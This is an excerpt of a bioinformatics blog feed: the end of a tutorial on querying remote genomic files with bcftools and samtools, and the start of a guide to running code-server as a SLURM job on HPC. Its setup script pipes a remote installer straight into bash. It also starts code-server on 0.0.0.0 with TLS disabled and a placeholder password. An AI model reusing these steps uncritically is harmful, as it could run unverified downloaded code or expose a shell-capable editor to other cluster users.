class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check curl verbose output</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">CURL_VERBOSE</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="8-recap-and-key-takeaways">8. Recap and Key Takeaways<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#8-recap-and-key-takeaways" class="hash-link" aria-label="Direct link to 8. Recap and Key Takeaways" title="Direct link to 8. Recap and Key Takeaways" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="81-what-weve-covered">8.1 What We've Covered<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#81-what-weve-covered" class="hash-link" aria-label="Direct link to 8.1 What We've Covered" title="Direct link to 8.1 What We've Covered" translate="no">​</a></h3>
<ul>
<li class=""><strong>Protocol Support</strong>: HTSlib tools support S3, FTP, and HTTPS remote file access natively</li>
<li class=""><strong>Authentication</strong>: Each protocol has different auth mechanisms (AWS credentials, FTP user<!-- -->:pass<!-- -->, Bearer tokens)</li>
<li class=""><strong>Efficient Queries</strong>: Indexed files enable byte-range requests, downloading only necessary data</li>
<li class=""><strong>Practical Workflows</strong>: Common tasks like region extraction, sample comparison, and annotation using remote files</li>
<li class=""><strong>Troubleshooting</strong>: How to diagnose and resolve common remote file access issues</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="82-key-takeaways">8.2 Key Takeaways<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#82-key-takeaways" class="hash-link" aria-label="Direct link to 8.2 Key Takeaways" title="Direct link to 8.2 Key Takeaways" translate="no">​</a></h3>
<ol>
<li class=""><strong>Always use indexes</strong> for remote files to avoid downloading entire datasets</li>
<li class=""><strong>Choose the right protocol</strong>: S3 for AWS, FTP for public repositories, HTTPS for APIs</li>
<li class=""><strong>Set up authentication correctly</strong> to avoid repeated connection failures</li>
<li class=""><strong>Stream processing</strong> reduces local storage requirements for large datasets</li>
<li class=""><strong>Verify indexes exist</strong> on remote servers before querying</li>
<li class=""><strong>Optimize by region</strong>: Place compute near data, batch similar queries, use appropriate timeouts</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="83-quick-reference-workflow">8.3 Quick Reference Workflow<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#83-quick-reference-workflow" class="hash-link" aria-label="Direct link to 8.3 Quick Reference Workflow" title="Direct link to 8.3 Quick Reference Workflow" translate="no">​</a></h3>
<p><strong>Setup (one time):</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Create project directory</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">mkdir</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> ~/genomics-work </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">cd</span><span class="token plain"> ~/genomics-work</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Initialize Pixi with conda-forge and bioconda</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi init </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--channel</span><span class="token plain"> conda-forge </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--channel</span><span class="token plain"> bioconda </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Add tools</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> bcftools samtools</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Verify installation</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run bcftools </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run samtools </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><br></span></code></pre></div></div>
<p><strong>Using remote files:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># 1. Set up authentication (optional, for private buckets)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">AWS_ACCESS_KEY_ID</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"..."</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">AWS_SECRET_ACCESS_KEY</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"..."</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">AWS_DEFAULT_REGION</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"us-east-1"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 2. Query real remote file (NCBI dbSNP via HTTPS - no auth needed)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run bcftools view </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  https://ftp.ncbi.nlm.nih.gov/snp/organisms/human_9606_b150_GRCh37p13/VCF/00-common_all.vcf.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> pixi run bcftools query </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'%CHROM\t%POS\t%REF\t%ALT\n'</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">head</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-20</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 3. Or for your own S3 data:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run bcftools view s3://my-bucket/variants.vcf.gz chr1:1-1000000 </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-O</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">v</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> chr1_subset.vcf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 4. Create local index for repeated use</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run bgzip </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> chr1_subset.vcf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run tabix </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> vcf chr1_subset.vcf.gz</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="84-next-steps">8.4 Next Steps<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#84-next-steps" class="hash-link" aria-label="Direct link to 8.4 Next Steps" title="Direct link to 8.4 Next Steps" translate="no">​</a></h3>
<ul>
<li class=""><strong>Explore your data</strong>: Start with small region queries to test setup</li>
<li class=""><strong>Automate workflows</strong>: Create scripts for common extraction and annotation tasks</li>
<li class=""><strong>Scale up</strong>: Use Nextflow or similar workflow managers for processing multiple files</li>
<li class=""><strong>Monitor costs</strong>: Track S3 data transfer and request costs if using cloud storage</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="85-additional-resources">8.5 Additional Resources<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#85-additional-resources" class="hash-link" aria-label="Direct link to 8.5 Additional Resources" title="Direct link to 8.5 Additional Resources" translate="no">​</a></h3>
<ul>
<li class=""><a href="http://www.htslib.org/doc/" target="_blank" rel="noopener noreferrer" class="">HTSlib documentation</a></li>
<li class=""><a href="http://www.htslib.org/doc/bcftools.html" target="_blank" rel="noopener noreferrer" class="">bcftools manual</a></li>
<li class=""><a href="http://www.htslib.org/doc/samtools.html" target="_blank" rel="noopener noreferrer" class="">samtools manual</a></li>
<li class=""><a href="https://www.internationalgenome.org/" target="_blank" rel="noopener noreferrer" class="">1000 Genomes Project</a></li>
<li class=""><a href="https://www.ensembl.org/biomart/martview" target="_blank" rel="noopener noreferrer" class="">Ensembl Biomart</a></li>
</ul>]]></content>
        <author>
            <name>Thanh-Giang Tan Nguyen</name>
            <email>nttg8100@gmail.com</email>
            <uri>https://www.facebook.com/nttg8100</uri>
        </author>
        <category label="bioinformatics" term="bioinformatics"/>
        <category label="htslib" term="htslib"/>
        <category label="bcftools" term="bcftools"/>
        <category label="samtools" term="samtools"/>
        <category label="s3" term="s3"/>
        <category label="remote-files" term="remote-files"/>
        <category label="cloud" term="cloud"/>
        <category label="genomics" term="genomics"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Setting Up a Local Nextflow Training Environment with Code-Server and HPC]]></title>
        <id>https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training</id>
        <link href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training"/>
        <updated>2026-02-15T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Setting up a robust development environment for Nextflow training across local and HPC systems requires a unified solution. Code-server provides a browser-based VS Code interface accessible from any machine, making it perfect for teams collaborating on Nextflow workflows. This guide walks you through configuring a complete Nextflow training environment with code-server, Singularity containers, and Pixi-managed tools.]]></summary>
        <content type="html"><![CDATA[<p>Setting up a robust development environment for Nextflow training across local and HPC systems requires a unified solution. Code-server provides a browser-based VS Code interface accessible from any machine, making it perfect for teams collaborating on Nextflow workflows. This guide walks you through configuring a complete Nextflow training environment with code-server, Singularity containers, and Pixi-managed tools.</p>
<p>For a comprehensive introduction to Pixi and package management, see our <a class="" href="https://riverxdata.github.io/river-docs/blog/pixi-is-new-conda-based-era">Pixi new-conda era</a>.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-install-code-server-with-pixi">1. Install Code-Server with Pixi<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#1-install-code-server-with-pixi" class="hash-link" aria-label="Direct link to 1. Install Code-Server with Pixi" title="Direct link to 1. Install Code-Server with Pixi" translate="no">​</a></h2>
<p>Code-server brings VS Code to your browser, allowing seamless development on HPC systems without local installation. We'll install it using Pixi for clean dependency management.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="11-what-is-code-server">1.1. What is Code-Server?<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#11-what-is-code-server" class="hash-link" aria-label="Direct link to 1.1. What is Code-Server?" title="Direct link to 1.1. What is Code-Server?" translate="no">​</a></h3>
<p>Code-server runs VS Code in your browser, giving you the familiar IDE interface while working on remote systems. This is ideal for:</p>
<ul>
<li class="">HPC cluster environments</li>
<li class="">Shared computing resources</li>
<li class="">Working from multiple machines</li>
<li class="">Team collaboration on training projects</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="12-understanding-pixi">1.2. Understanding Pixi<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#12-understanding-pixi" class="hash-link" aria-label="Direct link to 1.2. Understanding Pixi" title="Direct link to 1.2. Understanding Pixi" translate="no">​</a></h3>
<p>Pixi is a powerful package manager that simplifies installation of tools like Nextflow and Singularity. For detailed information on Pixi setup and usage, refer to our comprehensive <a class="" href="https://riverxdata.github.io/river-docs/blog/pixi-is-new-conda-based-era">Pixi- New conda era</a>.</p>
<p>In this guide, we'll use Pixi to manage code-server, Nextflow, Singularity, and nf-core tools directly within a SLURM job.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="13-launch-code-server-as-a-slurm-job">1.3. Launch Code-Server as a SLURM Job<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#13-launch-code-server-as-a-slurm-job" class="hash-link" aria-label="Direct link to 1.3. Launch Code-Server as a SLURM Job" title="Direct link to 1.3. Launch Code-Server as a SLURM Job" translate="no">​</a></h3>
<p>Submit code-server as a SLURM batch job. This ensures proper resource allocation and allows the job to run persistently on a compute node.</p>
<p>Create a SLURM job script that installs and starts code-server:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Create sbatch script</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> ~/code-server-job.sh </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;&lt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'EOF'</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">#!/bin/bash</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">#SBATCH --job-name=code-server</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">#SBATCH --time=24:00:00</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">#SBATCH --cpus-per-task=2</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">#SBATCH --mem=4GB</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">#SBATCH --output=%x-%j.log</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"># Install Pixi (one time per node)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">curl -fsSL https://pixi.sh/install.sh | bash</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">export PATH="$HOME/.pixi/bin:$PATH"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"># Install code-server and all tools using Pixi</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">pixi global install code-server open-jdk nextflow singularity nf-core nf-test</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"># Create code-server configuration directory</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">mkdir -p ~/.config/code-server</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"># Create configuration file</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">cat &gt; ~/.config/code-server/config.yaml &lt;&lt; 'CONFIGEOF'</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">bind-addr: 127.0.0.1:8080</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">auth: password</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">password: your-secure-password</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">cert: false</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">CONFIGEOF</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"># Start code-server</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">echo "Starting code-server on $HOSTNAME:8080"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">echo "Job ID: $SLURM_JOB_ID"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">echo "Node: $SLURM_NODENAME"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">code-server --bind-addr 0.0.0.0:8080</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">EOF</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Make script executable</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">chmod</span><span class="token plain"> +x ~/code-server-job.sh</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Submit the job</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sbatch ~/code-server-job.sh</span><br></span></code></pre></div></div>
<p>Check the job status and find which node it's running on:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check running jobs</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">squeue </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-u</span><span class="token plain"> </span><span class="token environment constant" style="color:hsl(35, 99%, 36%)">$USER</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># You should see output like:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># JOBID PARTITION     NAME     USER ST       TIME  NODES NODELIST(REASON)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 12345       gpu code-serv    user  R       0:15      1 compute-node-05</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check the log file for connection details</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> code-server-12345.log</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="job_log" src="https://riverxdata.github.io/river-docs/assets/images/sbatch_codeserver-cb7a6d4caf78a730f928ccdfa6ca94d6.png" width="1831" height="680" class="img_ev3q"></p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-access-code-server-from-local-machine-via-ssh-tunnel">2. Access Code-Server from Local Machine via SSH Tunnel<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#2-access-code-server-from-local-machine-via-ssh-tunnel" class="hash-link" aria-label="Direct link to 2. Access Code-Server from Local Machine via SSH Tunnel" title="Direct link to 2. Access Code-Server from Local Machine via SSH Tunnel" translate="no">​</a></h2>
<p>Code-server is now running on a compute node through your SLURM job. You need to create an SSH tunnel from your local machine through the login node to reach the compute node running code-server.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="21-find-your-code-server-job-node">2.1. Find Your Code-Server Job Node<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#21-find-your-code-server-job-node" class="hash-link" aria-label="Direct link to 2.1. Find Your Code-Server Job Node" title="Direct link to 2.1. Find Your Code-Server Job Node" translate="no">​</a></h3>
<p>First, identify which compute node your code-server job is running on:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># SSH into HPC login node</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">ssh</span><span class="token plain"> user@hpc.server.edu</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check your running jobs</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">squeue </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-u</span><span class="token plain"> </span><span class="token environment constant" style="color:hsl(35, 99%, 36%)">$USER</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Output example:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># JOBID PARTITION     NAME     USER ST       TIME  NODES NODELIST(REASON)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 12345      multi code-serv    user  R       5:30      1 worker-01</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Note the node name (worker-01 in this example)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Verify code-server is running</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">ssh</span><span class="token plain"> worker-01 </span><span class="token string" style="color:hsl(119, 34%, 47%)">'curl http://localhost:8080'</span><span class="token plain"> </span><span class="token operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain">/dev/null </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">head</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-5</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="22-create-ssh-tunnel-from-your-local-machine">2.2. Create SSH Tunnel from Your Local Machine<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#22-create-ssh-tunnel-from-your-local-machine" class="hash-link" aria-label="Direct link to 2.2. Create SSH Tunnel from Your Local Machine" title="Direct link to 2.2. Create SSH Tunnel from Your Local Machine" translate="no">​</a></h3>
<p>Now set up port forwarding from your local machine through the login node to the compute node running code-server:</p>
